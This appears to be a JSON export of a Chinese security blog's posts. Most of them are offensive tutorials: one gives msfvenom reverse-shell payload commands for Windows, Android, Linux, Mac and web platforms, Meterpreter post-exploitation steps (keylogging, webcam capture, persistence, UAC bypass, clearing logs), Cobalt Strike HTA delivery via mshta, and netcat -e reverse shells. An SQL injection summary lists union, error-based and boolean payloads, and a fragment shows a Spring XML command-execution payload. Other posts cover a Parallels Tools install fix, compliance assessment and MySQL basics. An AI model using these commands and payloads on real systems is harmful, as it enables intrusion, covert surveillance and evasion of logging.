&lt;value&gt;/bin/bash&lt;/value&gt; &lt;value&gt;-cc&lt;/value&gt; &lt;value&gt;&lt;![CDATA[echo '内容' &gt; 123.jsp]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; 试过写入一句话，连接失败。直接把木马复制进去也连接失败。 反弹shell不香吗，搞什么木马 5、总结过一遍复现过程，记下笔记。那不是有手就行。 以上仅供学习交流，严禁用于违法途径","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://k3vi-07.github.io/tags/%E6%BC%8F%E6%B4%9E/"}],"author":"诚默"},{"title":"KALI2020.4 安装pd tools 报错解决","slug":"kali2020-4-安装pd-tools-报错解决","date":"2020-12-02T06:19:00.000Z","updated":"2023-01-10T07:57:43.512Z","comments":true,"path":"2020/12/02/kali2020-4-安装pd-tools-报错解决/","link":"","permalink":"https://k3vi-07.github.io/2020/12/02/kali2020-4-%E5%AE%89%E8%A3%85pd-tools-%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/","excerpt":"不是翻译","text":"不是翻译 I managed to get Parallels Tools working today on my freshly updated Kali system by following the steps at https://kb.parallels.com/123968 but stopping before running ./install. Then follow the steps: Move into the kmods directory, where you should see a file called prl_mod.tar.gz. Extract this archive so we can edit it. 复制文件夹中所有文件到任意目录，进入kmos目录，解压prl_mod.tar.gz。 Open the file prl_fs/SharedFolders/Guest/Linux/prl_fs/inode.c and add the line “#define segment_eq(a, b) ((a).seg == (b).seg)” to the top. 打开文件prl_fs/SharedFolders/Guest/Linux/prl_fs/inode.c将内容#define segment_eq(a, b) ((a).seg == (b).seg)\"放到文件开头 Open the file prl_fs_freeze/Snapshot/Guest/Linux/prl_freeze/prl_fs_freeze.c and add the line “#include &lt;linux/blkdev.h&gt;” to the top.打开文件prl_fs_freeze/Snapshot/Guest/Linux/prl_freeze/prl_fs_freeze.c将内容#include &lt;linux/blkdev.h&gt;放在文件开头 Open the files prl_fs/SharedFolders/Guest/Linux/prl_fs/Makefile and prl_vid/Video/Guest/Linux/kmod/Makefile, and add the line “KBUILD_EXTRA_SYMBOLS := /usr/lib/parallels-tools/kmods/prl_tg/Toolgate/Guest/Linux/prl_tg/Module.symvers” to the top.编辑文件prl_fs/SharedFolders/Guest/Linux/prl_fs/Makefile和prl_vid/Video/Guest/Linux/kmod/Makefile，将内容KBUILD_EXTRA_SYMBOLS := /usr/lib/parallels-tools/kmods/prl_tg/Toolgate/Guest/Linux/prl_tg/Module.symvers添加到文件头 Re-create the archive with the edited files.使用kmods目录下命令创建压缩包tar tar -zcvf prl_mod.tar.gz . Now run ./install and it should work.使用管理员运行./install应该可以运行 PS: 亲测可用，如果按照失败，可以重启之后在安装一次","categories":[],"tags":[{"name":"kali","slug":"kali","permalink":"https://k3vi-07.github.io/tags/kali/"}],"author":"k3vi"},{"title":"几个渗透工具的简单使用","slug":"几个渗透工具的简单使用","date":"2020-09-14T08:27:00.000Z","updated":"2023-01-10T07:56:33.057Z","comments":true,"path":"2020/09/14/几个渗透工具的简单使用/","link":"","permalink":"https://k3vi-07.github.io/2020/09/14/%E5%87%A0%E4%B8%AA%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","excerpt":"1、Metasploit1.1 简介 一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程。 1.2 下载安装kali自带，非kali的linux安装命令 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \\ chmod 755 msfinstall &amp;&amp; \\ ./msfinstall 可能有些久","text":"1、Metasploit1.1 简介 一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程。 1.2 下载安装kali自带，非kali的linux安装命令 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \\ chmod 755 msfinstall &amp;&amp; \\ ./msfinstall 可能有些久 1.3 使用说明进入框架：msfconsole 使用search命令查找相关漏洞： search ms17-010 使用use进入模块: use exploit/windows/smb/ms17_010_eternalblue 使用info查看模块信息： info 设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp 查看模块需要配置的参数：show options 设置参数：set RHOST 192.168.125.138 set port 8888 攻击：exploit或run 漏洞利用exploit，也就是我们常说的 exp，他就是对漏洞进行攻击的代码。Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码 1.4 木马生成windows msfvenom -p windows/meterpreter/reverse_tcp LPORT=控制机端口 LHOST=控制机ip -f -o shell.exe 安卓app: msfvenom -p android/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口 -o test2.apk Linux: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口 -f elf &gt; shell.elf Mac: msfvenom -p osx/x86/shell_reverse_tcp LHOST=控制机ip LPORT=控制机端口 -f macho &gt; shell.macho PHP： msfvenom -p php/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口-f raw -o test.php ASP: msfvenom -p windows/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口-f asp &gt; shell.asp ASPX： msfvenom -p windows/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口-f aspx &gt; shell.aspx JSP: msfvenom -p java/jsp_shell_reverse_tcp LHOST=控制机ip LPORT=控制机端口 -f raw &gt; shell.jsp Bash： msfvenom -p cmd/unix/reverse_bash LHOST=控制机ip LPORT=控制机端口-f raw &gt; shell.sh Perl msfvenom -p cmd/unix/reverse_perl LHOST=控制机ip LPORT=控制机端口-f raw &gt; shell.pl python msfvenom -p python/meterpreter/reverser_tcp LHOST=控制机ip LPORT=控制机端口-f raw &gt; shell.py 1.5 实战生成恶意exe木马，在测试机上运行，在服务器进行反向连接 msfvenom -p windows/meterpreter/reverse_tcp LPORT=8888 LHOST=192.168.10.27 -f -o shell.exe 原理是让测试机运行木马后 连接 控制机ip：端口 进入msf控制台，完成以下配置 msf &gt; use exploit/multi/handler #使用exploit/multi/handler监听从肉鸡发来的数据 msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp #设置payload，不同的木马设置不同的payload msf exploit(handler) &gt; set lhost 192.168.10.27 #我们的主机ip msf exploit(handler) &gt; set lport 8888 #我们的主机端口 msf exploit(handler) &gt; run 然后在测试机上运行木马 连接成功 1.6 后渗透连接成功后的一些操作 run post/windows/gather/checkvm 判断是否是虚拟机蜜罐 keyscan_start：开始键盘记录 keyscan_dump：下载键盘记录 keyscan_stop：结束键盘记录 record_mic：录制声音（如果目标主机上有话筒的话） -d ：记录的秒数，默认为1秒 webcam_chat：查看摄像头接口 webcam_list：查看摄像头列表 webcam_stream：获取摄像头视频 run vnc：开启远程桌面webcam_stream 开启摄像头 webcam_snap 隐秘拍照功能 -i 1 或者2是开启前置摄像头和后置摄像头的 uictl disable mouse #禁用鼠标 uictl disable keyboard #禁用键盘 uictl enable mouse #开启鼠标 getpid # 获取当前进程的pid ps # 查看当前活跃进程 migrate &lt;pid值&gt; #将Meterpreter会话移植到指定pid值进程中 kill &lt;pid值&gt; #杀死进程 shell 进入cmd run persistence -S - U -X -i 10 -r 控制机ip -p 控制机端口 持久后门 Meterpreter 使用background来保存当前会话到后台 session 查看后台会话 sessions 可以查看已经成功获取的会话 可以使用sessions -i 连接到指定序号的meterpreter会话已继续利用 shell命令 获取目标主机的远程命令行shell(cmd) 提权 use exploit/windows/local/bypassuac_eventvwr命令进入该模块 设置session为你要使用的session clearev 清除日志跑路 2、CobaltStrike2.1 简介是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。 2.2 下载安装链接：https://pan.baidu.com/s/1ASUKsjtEr6roVdMVMmhUsg 提取码：8888 首先部署在linux服务器，默认使用的是50050端口,用户名是neo nohup ./teamserver 服务器ip 登陆密码 &gt;/dev/null 2&gt;&amp;1 &amp; nobup是后台运行 然后客户端连接，windows运行start.bat 连接成功 2.3 实战首先建立Listener（监听器） Cobait Strike-&gt;监听器-&gt;add 分别是服务器ip，服务器ip，服务器端口 生成后门，介绍一种 攻击-&gt;生成后门-&gt;HTML Application 选择刚配置的监听器 然后保存文件 然后配置文件下载 攻击-&gt;钓鱼攻击-&gt;文件下载 选择你之前生成的木马文件。 会生成一个下载链接 测试机执行 mshta http://ip:80/download/file1.ext 或下载运行 已连接机器图，然后右击进行各类操作 剩下的还是自己摸索这玩吧 接下来说一下MSF和CS联动1.1 MSF转移到CS简单方法进入cmd运行下 mshta http://ip:80/download/file1.ext 复杂一点的 use exploit/windows/local/payload_inject（选用exploit） set payload windows/x64/meterpreter/reverse_http（选用的payload一定要跟cs下监听的payload方式一样） set DisablePayloadHandler true（禁止产生一个新的handler） set LHOST IP（ip为cs监听会话用的ip） set LPORT 端口（端口为cs对应的接受反弹shell的端口） set pid 进程号（设置派生给cs后木马进程的pid进程号，如果有system权限则可以指定一个具有system权限的进程，这样cs接收到会话也是最高权限） set session 1（设置需要派送的meterpreter） exploit（开始执行） 1.2 CS转移到MSFmsf配置 use exploit/multi/handler set payload windows/meterpreter/reverse_http（跟cs上选用的payload一样） set lhost 本机ip set lport 接受的端口 exploit 执行 然后cs上，右击测试机-&gt;增加会话 增加监听器，payload选择Foreign HTTP，然后配置 然后选择这个监听器，就转移到msf上去了 3、nc（Netcat/瑞士军刀）1.1 简介可以读写TCP或UDP网络连接，，能被其它的程序或脚本直接驱动。同时，它又是一个功能丰富的网络调试和开发工具，它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能，它基于socket协议工作。在渗透测试领域，我们通常利用它来反弹shell。 nc端口扫描最主要的用途是，内网，我们的nmap工具是不能扫描到内网的，所以这时我们可以把nc上传到web服务器上，利用它来扫描内网主机。而由于nc体积很小，所以不容易被发现。 1.2 下载安装这个自己网上下载吧，很容易找到 1.3 使用说明-l： 开启监听 · -p：指定端口 · -t： 以telnet形式应答 -e：程序重定向 -n：以数字形式表示ip -v：显示执行命令过程 -z : 不进行交互，直接显示结果 -u ：使用UDP协议传输 -w : 设置超时时间 1.4 功能实现1.4.1 建立简单的聊天室服务器端： nc -lvp 8888 #监听8888端口 客户端： nc -nv ip 8888 #连接到服务器的8888端口 然后双发输入,对方都能看得到 1.4.2 传文件服务器端： nc -lvp 8888 &lt; test.txt 客户端： nc -nv ip 8888 &gt; te st.txt 1.4.3 正向连接肉鸡开放8888端口作为cmd执行 nc -lvv -p 8888 -t -e cmd.exe 我们的主机访问肉鸡的8888 nc -nvv 肉鸡ip 8888 1.4.4 反向连接我们的主机 nc -lvp 8888 nc -t -e cmd.exe 控制机ip 8888 未完待续 总结 工具还有.了解大概功能和原理，以后需要的时候就能直接使用。等有空的时候再写一点。 文章若存在问题，敬请指正。 以上仅供学习交流，严禁用于违法途径（手动狗头）","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"https://k3vi-07.github.io/tags/%E5%B7%A5%E5%85%B7/"}],"author":"诚默"},{"title":"等保测评之安全物理环境、安全管理","slug":"等保测评之安全物理环境、安全管理","date":"2020-08-27T08:17:00.000Z","updated":"2023-01-10T07:56:20.322Z","comments":true,"path":"2020/08/27/等保测评之安全物理环境、安全管理/","link":"","permalink":"https://k3vi-07.github.io/2020/08/27/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%E4%B9%8B%E5%AE%89%E5%85%A8%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E3%80%81%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86/","excerpt":"一、测评方法1.1. 测评工具 安全管理测评指导书 安全物理环境测评作业指导书 1.2. 作业指导书开发基本步骤 第一步：从《基本要求中》选择‘控制点’（测评指标）和要求项（测评项） 第二步：从《测评要求》中选择”测评方法“ 第三步：结合信息系统实际情况调整”测评方法“ 第四步最终形成作业指导书","text":"一、测评方法1.1. 测评工具 安全管理测评指导书 安全物理环境测评作业指导书 1.2. 作业指导书开发基本步骤 第一步：从《基本要求中》选择‘控制点’（测评指标）和要求项（测评项） 第二步：从《测评要求》中选择”测评方法“ 第三步：结合信息系统实际情况调整”测评方法“ 第四步最终形成作业指导书 1.3. 测评方式 访谈 核查 1.4. 核查与访谈的关系 通过访谈获得肯定的答案，通过核查验证访谈结果。 1.5. 访谈技巧访谈技巧 基于作业指导书开展 访谈对象的选择，覆盖适当的层次和职能； 访谈应在正常的工作时间和工作地点 说明访谈和做记录的原因 访谈可以从请对方描述工作开始 尽量避免有倾向性答案的问题 感谢对方配合 1.6. 询问问题 开放式和非开放式1.7. 核查核查 是指测评人员通过对测评对象进行观察、查验、分析等活动，获取证据以证明其安全保护措施是否有效的一种方法1.8. 核查对象核查对象 各类文件-制度文档 操作规程-执行记录 物理环境-基础础设施 二、安全管理测评流程2.1. 基本活动基本活动 核查是否存在有关的规定、制度或规程文档； 核查文档的描述细节是否设计相关的内容； 核查是否存在有关执行过程的记录文件或说明文件（证据） 核查文件的记录内容是否与规定、制度或规程要求一致； 访谈相关人员，要求其对描述不理解或者记录不理解内容的解释或说明 访谈相关人员，要求其对管理过程或执行过程解释和说明。 2.2. 测评流程测评流程 第一步，根据现场配合人员名单，进一步明确协调人员、访谈人员及时间 第二步，根据检查文档列表，获得制度、记录、规程等各类文档，并填写文档交接单； 第三步，审阅各类文档，并在现场测评作业指导书的相关项中进行结果记录 第四步，针对不确定项访谈相关人员或获得额外证据并记录； 第五步，整理作业指导书的结果记录，并确认签字 第六步，归还所有文档，并在文档交接单中签字。 三、安全物理环境测评流程3.1. 基本活动基本活动 实地察看场地条件、环境条件是否符合要求 实地察看设备、设施是否工作正常 实地查看是否存在有关设备、设施、标签、标识等； 核查设备、设施的检查报告或维护日志、核查机房设计验收文档 访谈相关人员，要求对不理解之处进行解释说明； 访谈相关人员，要求对管理过程或执行过程补充解释和说明 3.2. 测评流程测评流程 第一步，针对安全物理环境的测评项访谈相关人员 第二步，实地查看场地、环境条件以及设备、设施运行状态； 第三步，实地查看存在的有关设备、设施运行状态； 第四步，检查检测报告或维护日志、检查机房设计验收文档（可在进机房前完成）； 第五步，针对不确定项访谈相关人员； 第六步，整理作业指导书，整理结果记录并确认签字 3.3. 测评要点测评要点 机房、建筑的各类设计/验收文档（机房位置选择说明、机房建筑承受能力、机房建筑防雷、机房综合布线及接地、自动消防系统、机房防火和新风系统、电力供应和电磁防护等）； 机房配备电子门禁系统、分区管理、登录记录、专人陪同； 设备和线路贴不易去除标识； 设置专人值守的视频监控系统或机房报警系统； 电源线和信号线上的防雷措施（光纤接入除外） 自动消防报警系统运行状态、手提式或便携式灭火器的摆放位置及有效期、消防演习记录 机房天花板及墙壁是否存在防潮及结露现象，机房屋顶或活动办下面是否有水管、对为开放窗户的防雨措施； 机房空调温度显示、机房日常巡检温度记录； 双路师电接入、ups满负荷时最大负载、备用供电系统，电力供应应急演练记录。 3.4. 测评难点测评难点 机房防盗报警系统 机房区域防火隔离 双路市电供电或备用供电系统。 3.5. 安全物理环境测评注意事项 事项一：现场查看机房基础设施建设情况时，设施的有无并不能反映落实与否，关键查看设施是否有效的、正常运行； 事项二：当机房根据用途不同分为多个房间，处于不同位置时，各个机房应按相关的物理要求分别检查。 四、安全管理制度 4.1. 测评要点 总体方针政策文件、各类管理制度、各种操作规范及记录表单四类文档； 四类文档间的连贯性、完备性以及管理制度的覆盖面 管理制度文件格式、版本、装订记录、各种评审记录以及发放等级记录； 制定和修订方面的文字具体要求，修订计划，修订流程； 安全管理制度、修订的责任人、具体制定、发布流程。 4.2. 管理制度文件体系管理制度文件体系 第一层 安全方针政策 信息啊暖方针政策，总体安全，说明机构安全工作的总体目标、范围、原则和安全框架等 第二层 安全管理制度 对安全管理活动中的各类管理建立安全制度管理，约束管理行为。 第三层 技术标准、规范 安全管理制度的具体技术实现细节，对管理人员或者操作人员的日常管理操作建立操作规程 第四层 流程、表单、记录 安全制度、规范实施所需履行的流程，及需填写的表单，用于记录数据、监控实施。4.3. 测评难点测评难点 安全方针、管理制度、操作规程以及记录表单四类文件形成管理制度文件体系； 管理制度定期的评审、修订、完善。 安全管理机构4.4. 测评要点测评要点 查看岗位职责文件了解：安全管理组织构成情况，信息安全领导小组-信息安全管理工作的职能部门-具体岗位，具体职责分工情况； 机构人员及岗位人员配备情况(如安全管理员、系统管理员、网络管理员、审计员）； 根据岗位人员配备名单了解安全管理员是否时专职人员，其它岗位人员配备情况。 审批事项、审批部门、批准人及审批程序等（制度），审批过程实际执行记录，了解授权和审批情况； 沟通和合作情况，了解部门内外沟通和合作情况，各类会议纪要、外协单位联系档案等； 安全检查周期、内容、程序等，各类安全检查表格、以往安全检查记录或总结了解对信息系统的安全检查情况。4.5. 测试难点测试难点 网络安全领导小组或网络安全管理委员会的发布文件或授权文件； 专职安全管理员 对重要活动的逐级审批制度 定期的全面安全检查 五、安全管理人员5.1. 测评要点测评要点 录用、离岗、安全意识教育和培训方面的管理要求； 安全保密协议和关键岗位的安全协议； 离岗交接记录； 安全技能考核记录 培训计划和培训记录 外部人员访问方面的管控措施 5.2. 测评难点测评难点 关键岗位人员的社会背景审查，关键岗位安全协议 安全技能和安全认知的考核 对外部人员允许访问的区域、系统、设备、信息等内容的详细书面规定。 六、安全建设管理6.1. 测评要点测评要点 测评对象的定级报告、备案证书； 测评对象的安全保护等级与其它级别保护对象关系的整体规划方案； 安全设计方案、工程实施方案 软件开发、产品采购、工程实施、测试验收、系统交付等方面的管控措施； 过程控制记录、各个阶段产品评审记录、测试验收报告；与服务供应商签订的保密协议或安全责任书。 6.2. 测评难点测评难点 对主要的活动均需要遵循制度要求，规范化地执行各种活动，留有记录文件； 外包开发软件安装前的恶意代码检测和后门程序审查。 七、安全运维管理7.1. 环境管理 指定专门的部门或者人员负责机房安全 机房安全管理制度，机房基础设施定期维护记录、机房进出登记记录； 重要的区域安全管理7.2. 资产管理 编制与保护对象相关事务资产清单； 根据资产清单以及重要程度，经行标识和选择相应的管理措施； 对信息分类标识的原则和方法进行说明的文档7.3. 介质管理 介质本地、异地存储环境条件，分类和标识； 介质物理传输过程进行控制，并对查询和归档进行等级。7.4. 设备维护管理 指定设备万里负责人或负责部门 建立配套设施、软硬件维护方面的管理制度 设备带离机房或者办公环境的管控措施 含有存储介质的设备在报废或重用前，应进行完全的清除或被安全覆盖。7.5. 漏洞和风险管理 采取必要的措施识别安全漏洞和隐患，采取相应的控制手段和措施； 应定期开展安全测评，采取措施应对测评发现的安全问题。7.6. 网络和系统安全管理 应划分不同的管理员角色进行网络和系统的运维管理 应建立网络和系统方面的安全管理制度、操作手册、规程； 日常工作，包括本地用户和远程用户的访问管理、网络接入管理、网络设备管理、漏洞扫描、网络状态监控、检测和报警、账户管理、角色权限管理、补丁管理、日志或审计信息分析、日常维护等； 应严格控制变更性运维（运维工具、运程运维的开通）7.7. 恶意代码防范管理 提高所有用户的恶意代码防范意识，对外来计算机或存储设备接入需进行检查 应定期验证防范恶意代码攻击的技术措施的有效性7.8. 配置管理 应记录和保存基本配置信息，如网络拓扑结构、各设备安装的软件组件、版本、配置参数等； 基本配置信息改变纳入变更范畴，实施对配置信息改变进行控制并及时更新。7.9. 密码管理 应遵循密码相关国家标准和行业标准 使用密码主管部门认证核准的密码技术产品。7.10. 变更管理 应明确变更控制策略； 应建立变更的申报和审批控制程序 变更审批记录 变更后相关的管理制度和操作规程的变化 失败变更的恢复文件化程度及恢复过程的演练记录7.11. 备份和恢复管理 识别需要定期备份的重要业务信息、数据、系统等 备份和恢复的策略文档及操作规程，如备份方式、频度、介质、保存周期等； 数据的备份策略和恢复策略以及备份程序和恢复程序； 备份介质的有效性检查记录。 7.12 安全事件处理 应及时向安全管理部门报告所发现的安全弱点和可疑事件； 安全事件报告和处置管理制度，包括安全事件定义、定级、报告流程、不同事件的响应和处置流程； 安全事件处置过程的记录 应急预案管理 应急预案总体框架 各类主要事件的具体应急预案； 应急预案涉及人员、设备等的资源满足情况 应急预案的培训记录、演练记录。 7.13. 外包运维管理 外包运维服务商的选择符合规定； 签订协议，明确外包运维范围、工作内容、明确相关安全要求； 在技术方面和管理方面均具有按照等级保护要求开展运维工作能力。 八、 测评难点 重要区域的安全管理 信息分类标识的原则和方法； 重要介质中数据或软件的加密存储； 安全审计的集中管理； 定期的网络和系统的漏洞扫描 对移动时、便携式设备接入网络安全管理 对违规联网行为的管理。 系统运行日志和审计数据分析 系统角色权限的划分和管理 变更失败的文件化恢复程序，变更失败的恢复演练 变更后对相关制度和操作规程修订 数据恢复或系统切换操作记录，备份介质的有效性检查； 信息安全事件的应急预案，应急预案培训和演练； 应急预案文档的维护和更新 九、安全管理测评注意事项 事项一：系统某控制点或某条要求不适合该级别的基本要求（如外包开发、自行软件开发）；一定不要滥用“不适用”若果某条没达到要求，由于下面一条要求预期是有关联关系，那么这条要求不能说不适用而是不符合。或者说只能由不是用推到到不适用，而不能由不符合推到为不适用 事项二、当访谈结果与检查结果不一致，应综合分析，不能片面采信任一方。 事项三:访谈以具体对象展开，而不以控制点或要求展开; 事项四:访谈是获得证据不可或缺的手段，但往往访谈回答信息的客观性、准确性，依被访谈角色对相关内容了解程度、以及双方的有效沟通而定，因此需要测评人员正确引导和判断; 事项五:在检查文档时发现不同文档针对同一方面内容要求不一致，应分析原因，结合其他测评方式所获证据来判断;事项六:所检查的文档应是机构目前已正式发布实施的有效文档; 事项七:制度文档的审阅一方面要检查制度文档的规范内容，另外应通过审阅记录文档检查制度文档的落实，若二者存在不致，应进一步寻找证据，最终确认是制度未得到有效落实还是制度文档需要修订有效落实还是制度文档需要修订; 事项八:其他测评项获取的证据，也可能会成为某一测评项判定的依据; 事项九:当由于某种原因机构无法提供原有的所要求的证据时其他证据效力等同时，可采纳; 事项十:文档名称可能不同，需进一步确认文档具体内容。","categories":[],"tags":[{"name":"等保测评","slug":"等保测评","permalink":"https://k3vi-07.github.io/tags/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84/"}],"author":"shmily"},{"title":"mysql数据库学习笔记之数据库及MySQL基础","slug":"mysql数据库学习笔记之数据库及sql基础","date":"2020-08-27T06:24:00.000Z","updated":"2023-01-10T07:58:00.771Z","comments":true,"path":"2020/08/27/mysql数据库学习笔记之数据库及sql基础/","link":"","permalink":"https://k3vi-07.github.io/2020/08/27/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8Asql%E5%9F%BA%E7%A1%80/","excerpt":"数据库及SQL/MySQL基础1. 啥是数据库???说的通俗一点，数据库就像粮仓一样，粮仓的作用是用来管理和存储粮食，那么数据库就是用来存储和管理数据。 1.1 数据库的优点 可存储大量的数据； 十分方便检索 可以保持数据的一致性和完整性； 安全、可共享； 可以通过组合分析的手段产生新的数据。","text":"数据库及SQL/MySQL基础1. 啥是数据库???说的通俗一点，数据库就像粮仓一样，粮仓的作用是用来管理和存储粮食，那么数据库就是用来存储和管理数据。 1.1 数据库的优点 可存储大量的数据； 十分方便检索 可以保持数据的一致性和完整性； 安全、可共享； 可以通过组合分析的手段产生新的数据。 1.2 数据库的发展历程 下面即将进入数据库的第一个发展历程：程序员压力大呀 人工管理数据： 数据不保存； 数据需要应用程序自己管理，没有相应的软件系统来负责数据的管理工作，比较麻烦； 数据不可共享； 数据布局有独立性，数据的逻辑结构或物理结构发生变化后，就需要对相应的程序作出相应的更改，这就有加大了程序员的负担。第二个发展历程：对此面无表情 文件系统： 数据可以长期保存了 由专门的软件即文件系统进行数据管理，程序和数据之间由软件提供的存取方法进行转换，使应用程序与数据之间有了一定的独立性，程序和数据间有了独立性，程序员们可以解放了，可以将精力集中于算法上了。 数据共享性差 数据独立性低即将到达现代；解放啦 数据库系统阶段： 数据结构化； 数据共享好，冗余度低 数据独立性高 数据又DBMS统一管理和控制常见的数据库有哪些呢？ Oracle；（甲骨文） DB2；（IBM） SQL server；（微软） Sybase；（塞尔斯） MySQL；（甲骨文）#亲们，前面是数据库名，后面是数据库的厂商哈。我们该怎样理解数据库呢？ 我们常见的数据","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://k3vi-07.github.io/tags/mysql/"}],"author":"shmily"},{"title":"漏洞大总结1-SQL注入","slug":"漏洞大总结1-sql注入","date":"2020-07-30T02:23:00.000Z","updated":"2023-01-10T07:56:37.655Z","comments":true,"path":"2020/07/30/漏洞大总结1-sql注入/","link":"","permalink":"https://k3vi-07.github.io/2020/07/30/%E6%BC%8F%E6%B4%9E%E5%A4%A7%E6%80%BB%E7%BB%931-sql%E6%B3%A8%E5%85%A5/","excerpt":"漏洞大总结1-SQL注入—— 诚默 攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作,这个就是SQL注入。 1、什么是注入1.1 首先要了解注入的原理就比如前端查询用户id得到用户的数据 id=传入的值后台定义的语句如下 `date=select * from user where id=传入的值` `return date`","text":"漏洞大总结1-SQL注入—— 诚默 攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作,这个就是SQL注入。 1、什么是注入1.1 首先要了解注入的原理就比如前端查询用户id得到用户的数据 id=传入的值后台定义的语句如下 `date=select * from user where id=传入的值` `return date` 原本正常用户输入的值应当是1、2、3但是恶意用户可以输入 -1 or 1=1 获得全部的用户数据或输入 -1 union select user() 通过联合查询获取当前用户 1.2 分类 有回显的注入 联合注入 整数注入 字符注入 搜索注入 报错注入 没有回显的注入 布尔注入 时间盲注 二次注入 所以仔细分下来联合注入（整数、字符、搜索）、报错注入、布尔注入、时间盲注、二次注入 1.3 漏洞利用1.3.1 联合注入使用联合注入的场景一般为数据库查询的数据会回显到页面其中分为整数注入、字符注入、搜索注入分为这几种也是获取的数据类型或功能不同，后台代码大致如下 整数注入后台代码date=select * from user where id=前台传输的数据 字符注入后台代码date=select * from user where id='前台传输的数据' 搜索注入date=select * from user where name like '%前台传输的数据%' 所以要查询当前用户，需要使用不同的数据由于后台得到的数据会进行字符化处理，我们使用单引号来引起提前闭合，所以需要使用注释符（#或–）来注释最后一个单引号。注意的是，注释符后面还需要加个空格。 整数注入：id=-1 union select user() date=select * from user where id=-1 union select user() 字符注入：id=-1’ union select user() – date=select * from user where id='-1' union select user() -- ' 搜索注入：name=%’ union select user() – date=select * from user where name like '%%' union select user() -- %' 获取所有数据 整数注入：id=1 or 1=1 date=select * from user where id=-1 or 1=1 字符注入：id=’ or ‘1’=’1 date=select * from user where id='' or '1'='1' 搜索注入：name=%‘ or ‘%’=’ date=select * from user where id='%%' or '%'='%' 对联合注入先就说到这里 1.3.2 报错注入 报错注入分为updatexml、floor和exp 平时用的最多的是updatexmlUPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用： 改变文档中符合条件的节点的值 concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出用户0x7e ASCII码,实为~,upadtexml()报错信息为特殊字符、字母及之后的内容,为了前面字母丢失,开头连接一个特殊字符~ eg: concat(‘m’,’y’)=my concat中的sql语句可以被执行 concat执行sql注入语句，再利用updatexml的报错信息返回sql语句执行结果 updatexml第二个参数必须是字符串吧，所以才需要借助返回值为字符串的concat函数。 1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); 查询当前用户 再说floor报错的原理是rand和ordery by或group by的冲突select count(*) from test group by floor(rand(0)*2);因为 rand 函数的特殊性（如果使用rand()的话，该值会被计算多次）group by 进行分组时，floor(rand(0)*2)**执行一次（查看分组是否存在），如果虚拟表中不存在该分组，那么在插入新分组的时候 **floor(rand(0)*2) 就又计算了一次。（其实在上述 rand(0) 产生多个数据的时候，也能观察出来。只要 rand(0) 被调用，一定会产生新值）。rand是伪随机。所以*floor(rand(0)2)值依此是011011001当 group by 对其进行分组的时候，首先遇到第一个值 0 ，发现 0 不存在，于是需要插入分组，就在这时，*floor(rand(0)2)再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 ；然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2）;遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组，然后floor(rand(0)*2)又被触发，生成第五个值 1 ，因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了！所以报错 ?id=1'+ and( select 1 from (select count(*),concat((select ( select (select concat(0x7e,version(),0x7e ) )) from infomatioon_shcema.tables limt 0,1 ) floor(rand(0)*2)) x from information_schema.tables group by x)a)%23 %23是注释符#的url编码 exp函数报错本质是溢出报错exp是以e为底的指数函数，但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。~是取反符我们通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。?id=1' and exp(~( select * from (select user() )x))%23 1.3.3 布尔注入由于开发者将报错信息屏蔽导致，但是网页对于真假有不同的回显只显示你当前的条件是否正确或者错误，例如我们判断字段数 order by 2返回正确，order by 3返回错误一般经常使用的函数有以下几种分类 截取函数 substr() left() right() 转换函数 ascii（）将字符串转换为ascii码 hex（）将字符串的值转换为16进制的值 